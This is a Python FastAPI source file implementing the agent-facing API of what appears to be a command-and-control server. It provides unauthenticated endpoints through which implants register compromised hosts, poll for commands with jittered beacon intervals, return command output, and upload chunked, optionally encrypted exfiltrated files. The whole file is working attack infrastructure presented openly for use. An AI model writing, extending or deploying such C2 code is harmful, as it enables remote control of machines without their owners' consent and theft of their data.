"""Agent-facing API — unauthenticated endpoints that implants call."""

from datetime import datetime, timezone
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Request, status
from pydantic import BaseModel
from sqlalchemy import Column, Text
from sqlmodel import Session, select

from backend.classes.database import get_session
from backend.models.target import Target
from backend.models.command import Command

router = APIRouter(prefix="/agent", tags=["agent"])


# ── Request / Response schemas ────────────────────────────────────────

class RegisterRequest(BaseModel):
    hostname: str = ""
    ip_address: str = ""
    mac_address: str = ""
    os: str = ""
    communication_channel: str = "http"  # "http" | "dns"


class RegisterResponse(BaseModel):
    target_id: str


class BeaconResponse(BaseModel):
    commands: list[dict]
    sleep: int = 60       # seconds the implant should wait before next poll
    jitter: float = 0.3   # ±fraction: actual delay = sleep * uniform(1-jitter, 1+jitter)


class CommandResultRequest(BaseModel):
    output: str = ""


class ExfilChunkRequest(BaseModel):
    """Receive a base64-encoded (optionally encrypted) data chunk."""
    filename: str = ""
    chunk_index: int = 0
    total_chunks: int = 1
    data_b64: str = ""
    encryption: str = "none"       # none | aes | xor
    encryption_meta: str = ""      # hex key, etc.
    session_id: str = ""           # unique session identifier


# ── Endpoints ─────────────────────────────────────────────────────────

@router.post("/register", response_model=RegisterResponse)
def register(
    body: RegisterRequest,
    request: Request,
    session: Session = Depends(get_session),
):
    """Register or re-register an implant.  Returns stable target_id."""
    # Try to find existing target by hostname + mac to avoid duplicates
    stmt = select(Target)
    if body.mac_address:
        stmt = stmt.where(Target.mac_address == body.mac_address)
    elif body.hostname:
        stmt = stmt.where(
            Target.hostname == body.hostname,
            Target.ip_address == body.ip_address,
        )
    existing = session.exec(stmt).first() if (body.mac_address or body.hostname) else None

    if existing:
        existing.ip_address = body.ip_address or existing.ip_address
        existing.os = body.os or existing.os
        existing.status = "active"
        existing.communication_channel = body.communication_channel
        existing.last_seen = datetime.now(timezone.utc)
        session.add(existing)
        session.commit()
        return RegisterResponse(target_id=existing.id)

    # Fallback IP from the request itself
    client_ip = body.ip_address or (request.client.host if request.client else "")
    target = Target(
        hostname=body.hostname,
        ip_address=client_ip,
        mac_address=body.mac_address,
        os=body.os,
        status="active",
        communication_channel=body.communication_channel,
    )
    session.add(target)
    session.commit()
    session.refresh(target)
    return RegisterResponse(target_id=target.id)


@router.get("/{target_id}/commands", response_model=BeaconResponse)
def beacon(
    target_id: str,
    session: Session = Depends(get_session),
):
    """Implant polls this to pick up pending commands.  Returned commands
    are atomically marked ``sent`` so they are not re-delivered."""
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=404, detail="Unknown target")

    target.last_seen = datetime.now(timezone.utc)
    session.add(target)

    payload: list[dict] = []
    pending = session.exec(
        select(Command)
        .where(Command.target_id == target_id, Command.status == "pending")
        .order_by(Command.created_at)  # type: ignore[arg-type]
    ).all()

    for cmd in pending:
        # Always deliver system commands (e.g. deactivate); skip others if inactive
        if target.status == "inactive" and cmd.module_name != "system":
            continue
        payload.append({"id": cmd.id, "command": cmd.command})
        cmd.status = "sent"
        session.add(cmd)

    if target.status != "inactive":
        target.status = "active"

    session.commit()
    return BeaconResponse(
        commands=payload,
        sleep=target.beacon_interval,
        jitter=target.beacon_jitter,
    )


@router.post("/{target_id}/commands/{command_id}/result")
def submit_result(
    target_id: str,
    command_id: str,
    body: CommandResultRequest,
    session: Session = Depends(get_session),
):
    """Implant submits the output of a previously-delivered command."""
    cmd = session.exec(
        select(Command).where(
            Command.id == command_id,
            Command.target_id == target_id,
        )
    ).first()
    if not cmd:
        raise HTTPException(status_code=404, detail="Command not found")

    cmd.output = body.output
    cmd.status = "completed"
    session.add(cmd)
    session.commit()
    return {"status": "ok"}


@router.post("/{target_id}/exfil")
def receive_exfil(
    target_id: str,
    body: ExfilChunkRequest,
    session: Session = Depends(get_session),
):
    """Receive an exfiltrated data chunk via HTTP.  The implant sends
    base64-encoded (optionally AES/XOR encrypted) file fragments here."""
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=404, detail="Unknown target")

    # Generate session_id if not provided (for backward compatibility)
    session_id = body.session_id or f"{body.filename}_{datetime.now(timezone.utc).timestamp()}"

    # If this is the first chunk (index 0), clean up any previous chunks for this file
    if body.chunk_index == 0:
        # Delete previous exfil chunks for the same file
        existing_chunks = session.exec(
            select(Command).where(
                Command.target_id == target_id,
                Command.module_name == "exfil",
                Command.command.contains(f"file={body.filename}")
            )
        ).all()
        for chunk in existing_chunks:
            session.delete(chunk)
        session.flush()

    # Store as a command with module_name = "exfil" for easy retrieval
    meta = (
        f"file={body.filename} chunk={body.chunk_index}/{body.total_chunks} "
        f"enc={body.encryption} meta={body.encryption_meta} session={session_id}"
    )
    cmd = Command(
        target_id=target_id,
        command=meta,
        output=body.data_b64,
        module_name="exfil",
        status="completed",
    )
    session.add(cmd)
    session.commit()
    return {"status": "ok", "chunk": body.chunk_index}
